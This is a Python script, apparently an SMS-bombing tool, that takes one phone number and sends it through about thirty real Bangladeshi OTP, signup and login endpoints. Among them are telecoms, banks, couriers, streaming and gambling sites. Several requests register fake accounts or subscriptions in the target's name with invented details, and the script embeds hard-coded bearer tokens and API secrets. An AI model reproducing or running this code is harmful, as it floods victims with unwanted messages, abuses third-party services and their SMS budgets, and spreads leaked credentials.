import requests
import json

# Use the phone number
phn = 


# Get the phone number from the request


# Define the URL and headers
url = "https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
}

# Prepare the payload (data to send in the POST request)
data = {
    "r_token": "jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6",
    "msisdn": phn
}

# Make the POST request
response = requests.post(url, json=data, headers=headers, verify=False)

# Print the response
print(response.text)
#				2NO



# Define the URL and headers
url = 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber'
referer = 'https://doctime.com.bd/'
origin = 'https://doctime.com.bd'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'

# Prepare the payload (data to send in the POST request)
data = {
    'data': {
        'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
        'code': '88',
        'contact_no': phn,
        'country_calling_code': '88',
        'headers': {
            'PlatForm': 'Web'
        }
    }
}

# Define the headers
headers = {
    'Content-type': 'application/json',
    'Referer': referer,
    'Origin': origin,
    'User-Agent': user_agent
}

# Make the POST request
response = requests.post(url, json=data, headers=headers)

# Check the response
if response.status_code == 200:
    print(response.text)  # Process the response
else:
    print('Error occurred while sending the request.')

# 				3NO

# Define the URL and headers
url = "https://api.toybox.live/bdapps_handler.php"
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'
}

#  data 
data = {
    "Operation": "CreateSubscription",
    "MobileNumber": "88" + phn,  # Concatenating "88" with the phone number
    "PackageID": 100,
    "Secret": "HJKX71%UHYH"
}

# Make the POST request
response = requests.post(url, json=data, headers=headers)

# Check if the response was successful
if response.status_code == 200:
    print(response.text)  # Process the response
else:
    print(f"Error occurred: {response.status_code}")
#			4NO 

# Define the URL and headers
url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
    "Referer": "https://ghoorilearning.com/",
    "Origin": "https://ghoorilearning.com"
}

# Data
data = {
    "mobile_no": phn
}

# Make the POST request
response = requests.post(url, json=data, headers=headers, verify=False)

# Check if the response was successful
if response.status_code == 200:
    print(response.text)  # Process the response
else:
    print(f"Error occurred: {response.status_code}")
    #			5NO 

url = 'https://www.8654231.com/wps/verification/sms/register'

data = {
    "mobileNo": phn,
    "countryDialingCode": "880",
}

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64; en-US) AppleWebKit/602.15 (KHTML, like Gecko) Chrome/49.0.3145.397 Safari/603',
    'Referer': 'https://www.8654231.com/m/register?affiliateCode=dbycj',
    'Cookie': 'tcg-sid=0a70b09c-a032-43f1-86f2-63d6dae3f98f',
    'Merchant': 'jili777f3',
    'ModuleId': 'REGMOBVERF3',
    'Language': 'EN',
}

# Send POST request
response = requests.post(url, json=data, headers=headers)

# Handle response
if response.status_code == 200:
    print(f'API Response: {response.text}')
else:
    print(f'Error: {response.status_code} - {response.text}')
#				6NO

url = "https://bmapi.social-trust.io/user/pin-codes"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-agent": "okhttp/7.4"
}

# Prepare the data to be sent as form-encoded
data = {
    "phoneNumber": phn,
    "country": "BD"
}

# Send POST request
response = requests.post(url, data=data, headers=headers, verify=False)

# Handle response
if response.status_code == 200:
    print(f'API Response: {response.text}')
else:
    print(f'Error: {response.status_code} - {response.text}')
#			7NO

url = "https://coreapi.shadhinmusic.com/api/v5/otp/otpreq"

# Prepare the data to be sent as JSON
data = {
    "msisdn": "88" + phn,  # Prefix the phone number with '88'
    "user": "sh@dHinOTP",
    "servicename": "Shadhin Music",
    "action": "Registration"
}

# Headers
headers = {
    'Content-Type': 'application/json',
}

# Send POST request
response = requests.post(url, json=data, headers=headers)

# Handle the response
if response.status_code == 200:
    # Request successful, parse and print the response data
    response_data = response.json()
    print(response_data)
else:
    # Request failed, print error code
    print(f"Error: {response.status_code}")
#			8NO

url = "https://api.redx.com.bd/v1/user/signup"

# Prepare the data to be sent as JSON
data = {
    "name": "Alamin Sheikh",
    "phoneNumber": phn,
    "service": "redx"
}

# Headers
headers = {
    'Content-Type': 'application/json',
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers, verify=False)

# Handle the response
if response.status_code == 200:
    print(response.text)
else:
    print(f"Error: {response.status_code} - {response.text}")
#	9	NO    

url = "https://api.redx.com.bd/v1/user/signup"

# Prepare the data to be sent as JSON
data = {
    "name": phn,
    "phoneNumber": phn,
    "service": "redx"
}

# Headers
headers = {
    'Content-Type': 'application/json',
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers, verify=False)

# Handle the response
if response.status_code == 200:
    print(response.text)
else:
    print(f"Error: {response.status_code} - {response.text}")
#		10NO


url = "https://developer.quizgiri.xyz/api/v2.0/send-otp?"

# Prepare the data to be sent as JSON
data = {
    "country_code": "+880",
    "phone": phn
}

# Headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers, verify=False)

# Handle the response
if response.status_code == 200:
    print(response.text)
else:
    print(f"Error: {response.status_code} - {response.text}")
#		11No


# First Request
url1 = "http://api.blackfire-tools.xyz/call/babu88-capcha.php"

# Send POST request to the first URL
response1 = requests.post(url1, headers={"Content-Type": "application/json"}, verify=False)


#print(response1.text)

# Second Request
url2 = "https://feapi.1688ninja.xyz/api/member"


# Remove the leading '0' from the phone number
phn = phn.lstrip('0')

# Prepare data to be sent in JSON format
data = {
    "membercode": "a" + phn,
    "password": phn,
    "currency": "BDT",
    "email": "",
    "registration_site": "desktop",
    "mobile": phn,
    "line": "",
    "referral_code": "",
    "is_early_bird": "0",
    "domain": "https://www.babu88.co",
    "language": "bd",
    "reg_type": 2,
    "agent_team": "",
    "utm_source": None,
    "utm_medium": None,
    "utm_campaign": None,
    "s2": None,
    "fp": "444dbac87a" + phn + "b5132f89dcf11d1676727a",
    "c_id": None,
    "pid": None,
    "stag": None,
    "tracking_url": None,
    "captcha_id": "6f736b71-8188-4615-bef5-f5a83646d4a8",
    "captcha_code": "0000"
}

# Send POST request to the second URL
headers2 = {
    "Content-Type": "application/json",
    "user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.2; x64; en-US Trident/5.0)",
}

response2 = requests.post(url2, json=data, headers=headers2, verify=False)

# Output the second response
print(response2.text)
#		12NO

# URL for the API request
url = 'https://userapp.steadfast.com.bd/api/send-otp/1'

# Prepare the data to be sent as JSON
data = {
    'b_name': '',
    'name': 'Korim Mia',
    'email': 'korimmia@gmail.com',
    'mobile': phn,
    'password': 'Boss2024'
}

# Headers
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'okhttp/4.9.2'
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers)

# Print the response
print(response.text)
# 			13NO

# API endpoint
apiEndpoint = 'https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp'

# Your API request data
data = {
    "country_code": "+88",
    "phone": phn
}

# Set headers
headers = {
    'Content-Type': 'application/json',
}

# Send POST request with JSON data
response = requests.post(apiEndpoint, json=data, headers=headers)

# Check if the request was successful
if response.status_code == 200:
    print(response.text)
else:
    print(f"Error: {response.status_code} - {response.text}")
#			14NO

# URL for the API request
url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"

# Prepare the data to be sent as JSON
data = {
    "full_name": "Hangama",
    "company_name": "Hangama",
    "email_address": "hangama@gmail.com",
    "phone_number": phn
}

# Headers
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers, verify=False)

# Print the response
print(response.text)
#			15NO

# API URL
url = "https://user-api.jslglobal.co/v1/send-otp"

# Prepare the form data
data = {
    "phone": "+88" + phn,
    "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
}

# Set headers
headers = {
    "User-Agent": "okhttp/3.9",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Send POST request with form data
response = requests.post(url, data=data, headers=headers, verify=False)

# Output the response
print(response.text)

#			16NO

# API URL
url = 'https://ucapi.vnksrvc.com/users/send_user_otp.json'

# Prepare the data to be sent as JSON
data = {
    'direct_login': True,
    'user': {
        'login': '88' + phn,
        'resend': False,
        'type': {'register': True}
    }
}

# Headers
headers = {
    'Content-Type': 'application/json',
}

# Send POST request with JSON data
response = requests.post(url, json=data, headers=headers)

# Check for successful response
if response.status_code == 200:
    print('Response:', response.text)
else:
    print(f"Error: {response.status_code} - {response.text}")

#		17NO


# API URL
url = "https://prod-api.viewlift.com/identity/otp/resend?site=hoichoitv"

# Prepare the form data
data = {
    'phoneNumber': '+88' + phn,
}

# Set headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
}

# Send POST request with form data
response = requests.post(url, data=data, headers=headers, verify=False)

# Output the response
print(response.text)

#			18NO

# API URL
url = "https://core.easy.com.bd/api/v1/registration"

# Prepare the JSON payload
data = {
    "name": "Shahidul Islam",
    "email": "uyrlhkgxqw@emergentvillage.org",
    "mobile": phn,
    "password": "boss#2022",
    "password_confirmation": "boss#2022",
    "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
}

# Set headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Referer": "https://easy.com.bd/",
    "Content-Type": "application/json",
}

# Send POST request with JSON data and headers
response = requests.post(url, json=data, headers=headers, verify=False)

# Output the response
print(response.text)
#		19NO

# API URL
url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web"

# Prepare the JSON payload
data = {
    "number": phn
}

# Set headers
headers = {
    "Content-Type": "application/json"
}

# Send POST request with JSON data and headers
response = requests.post(url, json=data, headers=headers, verify=False)

# Output the response
print(response.text)

#			20NO

# API URL
url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

# Prepare the JSON payload
data = {
    "AccessToken": "",
    "TrackingNo": "",
    "mobileNo": phn,
    "otpSms": "",
    "product_id": "250",
    "requestChannel": "MOB",
    "trackingStatus": 5
}

# Set headers
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
}

# Send POST request with JSON data and headers
response = requests.post(url, json=data, headers=headers, verify=False)

# Output the response
print(response.text)


#		21NO

# API URL
url = "https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp"

# Prepare the JSON payload
data = {
    "countryId": "19",
    "mobileNumber": phn,
    "purpose": "registration"
}

# Set headers
headers = {
    "authorization": "Otp bnVsbA==",
    "Content-Type": "application/json"
}

# Send POST request with JSON data and headers
response = requests.post(url, json=data, headers=headers, verify=False)

# Output the response
print(response.text)

#		22NO

# API URL
url = "https://webapi.robi.com.bd/v1/send-otp"

# Prepare the JSON payload
data = {
    "phone_number": phn,
    "type": "my_offer"
}

# Set headers
headers = {
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjE4MSwibmJmIjoxNjkyNjQyMTgxLCJleHAiOjE2OTI2NDU3ODEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.zIjqAeTCI-kFmH5nTuAII1HzQISfOLOyLfYH4FlcjXA",
    "Content-Type": "application/json"
}

# Send POST request with JSON data and headers
response = requests.post(url, json=data, headers=headers, verify=False)

# Output the response
print(response.text)

#		23NO

# URL with query parameters
url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phn}&lang=en&ng=0"

# Set the headers
headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
}

# Send GET request
response = requests.get(url, headers=headers, verify=False)

# Print the response text
print(response.text)

#			24NO


# URL with query parameter (you may need to add service_key value here if it's missing in the request)
url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="  # Add the actual service key here

# Set the headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
}

# Create the payload (data to be sent in the POST request)
data = {
    "msisdn": phn,  # Mobile number
}

# Send POST request
response = requests.post(url, headers=headers, json=data, verify=False)

# Print the response text
print(response.text)

#			25NO


# URL for registration API
url = "https://app.eonbazar.com/api/auth/register"

# Data payload
data = {
    "mobile": phn,
    "name": "Karim Mia",
    "password": "karim2023",
    "email": f"dghdj{phn}dsgj@gmail.com"  # Dynamic email generation using phone number
}

# Convert the data to JSON
data_string = json.dumps(data)

# Headers to send with the request
headers = {
    'Content-Type': 'application/json',
    'Content-Length': str(len(data_string))
}

# Send POST request
response = requests.post(url, data=data_string, headers=headers)

# Output the response from the API
print(response.text)

#		26NO

# Construct the URL with the phone number
url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phn}"

# Make the HTTP request
response = requests.get(url, verify=False)  # verify=False to ignore SSL certificate validation

# Print the response from the API
print(response.text)

#			27NO

# API URL
url = "https://api.bongo-solutions.com/auth/api/v2/login/send-otp"

# Headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
    "Access-code": "QkQ%3D",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI1NmE2OGVjNi03YWMxLTRjMDAtYjExNy0yNGZhYTVjMmY4YzciLCJpc3MiOiJIRUlNREFMTCIsInJvbGVzIjpbIlJPTEVfVVNFUiIsIlJPTEVfVVNFUl9BTk9OWU1PVVMiXSwidXNlcm5hbWUiOiJhbm9ueW1vdXMiLCJjbGllbnRfbG9naW5faWQiOjk2MTE0Nzc5OTM4LCJjbGllbnRfaWQiOiI3OTNhM2M5NTc2MjI0OTkwODY5ODhiMDVhMzRlODAzMCIsInBsYXRmb3JtX2lkIjoiYWJmZWE0NjItZjY0ZC00OTFlLTljZDktNzVlZTAwMWY0NWIwIiwiYm9uZ29faWQiOiI1NmE2OGVjNi03YWMxLTRjMDAtYjExNy0yNGZhYTVjMmY4YzciLCJ1c2VyX3R5cGUiOiJhbm9ueW1vdXMiLCJpYXQiOjE3MTAxNDk1OTEsImV4cCI6MTcxNzkyNTYwMS4wLCJjb3VudHJ5Q29kZSI6IkJEIiwicHJlZmVycmVkX3VzZXJuYW1lIjpudWxsfQ.fPcw65NNfcrKxnlfzBJoVfDqsEpH0xAt4XTUJMfCKT0sDEVZa5T-aXummdkA3ShyqwgUS1O9Y1-l1VKXhMMmsYR83YL7Jp_YIWgYiKjjnlhDZESZPta9Wu1Ssdm8AZZUlpMA100mq5SvVRTLqFYcsiXKde1nGVAkoIggjd4pGTCWMOsQQNRe8SiLzxzYgklygwJUma9OVJsOR_VpZyU_MXZ8i-FD4m4mFFCH-udFA67aAp0j35e5sG1xr4db-xfdCxf-OoRoV9uiEz0MqYZbld6-vBLM9-Tt_RhGn10tYtj3SUPETTYFKw8TjcXAXsBvmif3CK3634KHHW8sjntJ2Luc5x24E9T-oy6kyZG3fJVQY-wuIcK7tycQaGWSHKW9vJRxOZH7Db2VqFWwLMUqhrd0uACwoTazJvGoMFJOpZuu_4Nt8Q-LfBNJDw5XMxq4JUp3Jixp6Xf8osKB-S14p6X7XR24VbW_siuaS00L6D6e9ogb4vliAMGw017gYTxAtWCIi4J3L9K-apA2BJ-RkM-suHMYOaTqVf1-GUDb4I7jYCp1ePSmVqEgugjlrOAafF2LIjjQtZqEEE6CMSxfI0y0rhbzAcTlG7NYlH53YKLlvGr9QVqC9FD8RX8CWw8zF4rv161bbgWRUxeWQFocmMDAIrXTN1vV3bx-mTVUeJE",
    "platform-id": "abfea462-f64d-491e-9cd9-75ee001f45b0",
    "Country-Code": "QkQ%3D",
    "client-id": "abfea462-f64d-491e-9cd9-75ee001f45b0",
    "Origin": "https://gp.bioscopelive.com",
    "Connection": "keep-alive",
    "Referer": "https://gp.bioscopelive.com/"
}

# Data to be sent in the POST request
data = {
    "operator": "all",
    "msisdn": "88" + phn,  # Prepend country code
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NDAzNzgwMzAuMH0.T-Zngti1xkCh6SnmJRcZjTUr8uCdLtpo1s00-SOaofpT-woZNnCJhxpRLPrLLj6I7X1k6-Pa03om4vmHCTKjuA",
    "token_type": "CUSTOM_TOKEN_V1"
}

# Make the POST request
response = requests.post(url, json=data, headers=headers, verify=False)  # verify=False to ignore SSL warnings

# Print the response from the API
print(response.text)

#					27NO


# API URL
url = "https://api3.bioscopelive.com/auth/api/v2/login/send-otp"

# Headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
    "Access-code": "QkQ%3D",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI0YTdhNTNmNC1lOTY5LTQxMTAtODU2MS1jN2MxNWJjMmJjNzMiLCJpc3MiOiJIRUlNREFMTCIsInJvbGVzIjpbIlJPTEVfVVNFUiIsIlJPTEVfVVNFUl9BTk9OWU1PVVMiXSwidXNlcm5hbWUiOiJhbm9ueW1vdXMiLCJjbGllbnRfbG9naW5faWQiOjc3NDk4NTkxMjcwLCJjbGllbnRfaWQiOm51bGwsInBsYXRmb3JtX2lkIjoiYzNjOThkMWItYzU4MS00NTJkLWEzODUtOTQxY2E2OTQwMWU5IiwiYm9uZ29faWQiOiI0YTdhNTNmNC1lOTY5LTQxMTAtODU2MS1jN2MxNWJjMmJjNzMiLCJ1c2VyX3R5cGUiOiJhbm9ueW1vdXMiLCJpYXQiOjE2OTI3ODY5NTYsImV4cCI6MTcwMDU2Mjk2Ni4wLCJjb3VudHJ5Q29k…G8Ee1qmq1G9YZ3jVc4CyxCKr0rET6ZVt4fefy-McQdwWUSQvYsyGHc1qfKGGzTbmW8wFTQSiIovBBL4QBdMAFmt1ucbwIFQyk6F9MKrZKkve_TRkiKVH7xZLltbJYDliTWmJttOTjW4As8lzDCsW4XP9WjsxWCe0XXN2pN-vPpLyqmB-_meqQ49ebPsHZ0IhLOl7Wy8J84T8nFTPUmXXG9qveivxcZr-TYImiCXtge6WQYkKx7vjdj3NSzEnrf38E_SOGfTU_w8lJMNhsI7W50AihviHyZZmydsEbWiVLcdlXPnPYveByPQcG4cLEw65mNAwEDGgjl0OUsw3gGFnsnuB50w2sTqOyYLFlGFPfLdIP2lIS8xywibjuA8SL4QjlTblqq86LuF-3xbj_28yoanP8plBhkFMK1_wJxRvuc88lZBgaA5oP4jrgDSSFflZT2BxzZmxoKozF8xG0sbNVjJxqNcNvGj_snbOixsSQSLQJSCZPpaWx2t20riVUec",
    "platform-id": "c3c98d1b-c581-452d-a385-941ca69401e9",
    "Country-Code": "QkQ%3D",
    "client-id": "c3c98d1b-c581-452d-a385-941ca69401e9",
    "Origin": "https://gp.bioscopelive.com",
    "Connection": "keep-alive",
    "Referer": "https://gp.bioscopelive.com/"
}

# Data to be sent in the POST request
data = {
    "operator": "all",
    "msisdn": "88" + phn,  # Prepend country code to the phone number
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NDAzNzgwMzAuMH0.uqjbUG9iSJj6bWp2Kvfj7xbkhKupy8bCrEBtj6kfbdsq04LXryL8f0xyr9xbQBqh4susgCd76_LPLrThNfRRAQ",
    "token_type": "CUSTOM_TOKEN_V1"
}

# Make the POST request
response = requests.post(url, json=data, headers=headers, verify=False)  # verify=False to ignore SSL warnings

# Print the response from the API
print(response.text)

#				28NO


# API URL
url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phn}"

# Headers
headers = {
    "Host": "bikroy.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Application-name": "web",
    "Connection": "keep-alive",
    "Referer": "https://bikroy.com/?login-modal=true&redirect-url=/"
}

# Make the GET request
response = requests.get(url, headers=headers, verify=False)  # verify=False to ignore SSL warnings

# Print the response from the API
print(response.text)

#			29NO


# API URL
url = "https://applink.com.bd/appstore-v4-server/login/otp/request"

# Headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Referer": "https://applink.com.bd/",
    "Content-Type": "application/json",
    "Origin": "https://applink.com.bd"
}

# Data to be sent in the POST request
data = {
    "msisdn": "88" + phn  # Prepending country code to the phone number
}

# Make the POST request
response = requests.post(url, json=data, headers=headers, verify=False)  # verify=False to disable SSL verification

# Print the response from the API
print(response.text)

#			30NO

# API URL
url = f"http://68.183.88.91/adpoke/cnt/dot/nserve/bd/send/otp?msisdnprefix=880&msisdn={phn}&token=1693254641407n62562185n33&l="

# Headers
headers = {
    "Referer": "http://68.183.88.91/",  # Replace with actual Referer if necessary
}

# Make the GET request
response = requests.get(url, headers=headers, verify=False)  # verify=False to ignore SSL warnings

# Check if the request was successful
if response.status_code == 200:
    print("OTP sent successfully. Response:", response.text)
else:
    print(f"Failed to send OTP. Status code: {response.status_code}, Response: {response.text}")
